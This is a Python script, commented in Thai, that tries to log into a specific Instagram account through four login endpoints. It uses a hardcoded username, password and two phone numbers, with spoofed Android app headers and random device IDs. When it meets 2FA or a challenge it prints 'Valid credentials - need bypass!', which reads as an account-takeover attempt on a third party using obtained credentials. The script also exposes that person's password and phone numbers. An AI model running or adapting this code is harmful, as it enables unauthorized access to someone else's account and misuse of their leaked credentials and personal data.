#!/usr/bin/env python3
"""
Instagram Quick Login Test
ทดสอบ login อย่างรวดเร็วด้วย credentials ที่ได้รับ
"""

import sys
import requests
import json
import time
from datetime import datetime
import uuid

def safe_print(*args, **kwargs):
    """Safe print function"""
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except:
        pass

def test_instagram_login():
    """ทดสอบ login Instagram แบบเร็ว"""
    safe_print("🚀 Quick Instagram Login Test")
    safe_print("🎯 Target: alx.trading / Fleming654")
    safe_print("📱 Testing multiple endpoints...")
    
    # ข้อมูลการทดสอบ
    username = "alx.trading"
    password = "Fleming654"
    
    # ทดสอบหลาย endpoint
    endpoints = [
        {
            'name': 'Web Login',
            'url': 'https://www.instagram.com/accounts/login/ajax/',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': 'missing',
                'X-Instagram-AJAX': '1',
                'Referer': 'https://www.instagram.com/accounts/login/',
            },
            'data': {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
        },
        {
            'name': 'Mobile API',
            'url': 'https://i.instagram.com/api/v1/accounts/login/',
            'headers': {
                'User-Agent': 'Instagram 285.0.0.30.99 Android (30/11; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 430123456)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': f'android-{uuid.uuid4().hex[:16]}',
            },
            'data': {
                'username': username,
                'password': password,
                'device_id': f'android-{uuid.uuid4().hex[:16]}',
                '_uuid': str(uuid.uuid4()),
                'login_attempt_count': '0'
            }
        },
        {
            'name': 'Phone Login (TH)',
            'url': 'https://i.instagram.com/api/v1/accounts/login/',
            'headers': {
                'User-Agent': 'Instagram 285.0.0.30.99 Android (30/11; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 430123456)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': f'android-{uuid.uuid4().hex[:16]}',
            },
            'data': {
                'username': '0615414210',
                'password': password,
                'device_id': f'android-{uuid.uuid4().hex[:16]}',
                '_uuid': str(uuid.uuid4()),
                'login_attempt_count': '0'
            }
        },
        {
            'name': 'Phone Login (UK)',
            'url': 'https://i.instagram.com/api/v1/accounts/login/',
            'headers': {
                'User-Agent': 'Instagram 285.0.0.30.99 Android (30/11; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 430123456)',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': f'android-{uuid.uuid4().hex[:16]}',
            },
            'data': {
                'username': '+447793127209',
                'password': password,
                'device_id': f'android-{uuid.uuid4().hex[:16]}',
                '_uuid': str(uuid.uuid4()),
                'login_attempt_count': '0'
            }
        }
    ]
    
    results = []
    
    for i, endpoint in enumerate(endpoints, 1):
        safe_print(f"\n🎯 TEST {i}/{len(endpoints)}: {endpoint['name']}")
        safe_print(f"📱 Identifier: {endpoint['data'].get('username', 'N/A')}")
        safe_print("-" * 40)
        
        try:
            session = requests.Session()
            response = session.post(
                endpoint['url'],
                data=endpoint['data'],
                headers=endpoint['headers'],
                timeout=15,
                allow_redirects=False
            )
            
            safe_print(f"📊 Status: {response.status_code}")
            safe_print(f"📊 Length: {len(response.text)}")
            safe_print(f"📊 Preview: {response.text[:150]}...")
            
            result = {
                'name': endpoint['name'],
                'identifier': endpoint['data'].get('username', 'N/A'),
                'status_code': response.status_code,
                'response_length': len(response.text),
                'response_preview': response.text[:200],
                'timestamp': datetime.now().isoformat()
            }
            
            # ตรวจสอบ JSON response
            try:
                json_data = response.json()
                result['json'] = json_data
                
                if json_data.get('authenticated') or json_data.get('logged_in_user'):
                    safe_print("🎉 LOGIN SUCCESS!")
                    result['success'] = True
                elif json_data.get('two_factor_required'):
                    safe_print("📱 2FA REQUIRED!")
                    result['two_factor'] = True
                elif 'challenge' in json_data:
                    safe_print("🔍 CHALLENGE REQUIRED!")
                    result['challenge'] = True
                else:
                    safe_print(f"❌ Failed: {json_data.get('message', 'Unknown')}")
                    
            except json.JSONDecodeError:
                safe_print("⚠️ Non-JSON response")
                result['json'] = None
            
            results.append(result)
            
        except Exception as e:
            safe_print(f"❌ Error: {e}")
            results.append({
                'name': endpoint['name'],
                'identifier': endpoint['data'].get('username', 'N/A'),
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
        
        # หน่วงเวลาระหว่างการทดสอบ
        if i < len(endpoints):
            safe_print("⏱️ Waiting 3 seconds...")
            time.sleep(3)
    
    # บันทึกผลลัพธ์
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_file = f"quick_login_test_{timestamp}.json"
    
    try:
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        safe_print(f"\n💾 Results saved to: {results_file}")
    except Exception as e:
        safe_print(f"⚠️ Could not save results: {e}")
    
    # สรุปผลลัพธ์
    success_count = sum(1 for r in results if r.get('success'))
    challenge_count = sum(1 for r in results if r.get('challenge'))
    two_factor_count = sum(1 for r in results if r.get('two_factor'))
    
    safe_print(f"\n📊 QUICK TEST SUMMARY")
    safe_print("=" * 40)
    safe_print(f"🎯 Total tests: {len(results)}")
    safe_print(f"✅ Successful logins: {success_count}")
    safe_print(f"🔍 Challenges: {challenge_count}")
    safe_print(f"📱 2FA required: {two_factor_count}")
    
    if success_count > 0:
        safe_print("\n🎉 MISSION ACCOMPLISHED!")
    elif challenge_count > 0 or two_factor_count > 0:
        safe_print("\n🎯 ACCOUNT CONFIRMED!")
        safe_print("✅ Valid credentials - need bypass!")
    else:
        safe_print("\n🔄 NEED MORE INVESTIGATION")
    
    return results

if __name__ == "__main__":
    try:
        results = test_instagram_login()
    except KeyboardInterrupt:
        safe_print("\n⚠️ Test interrupted")
    except Exception as e:
        safe_print(f"❌ Fatal error: {e}")
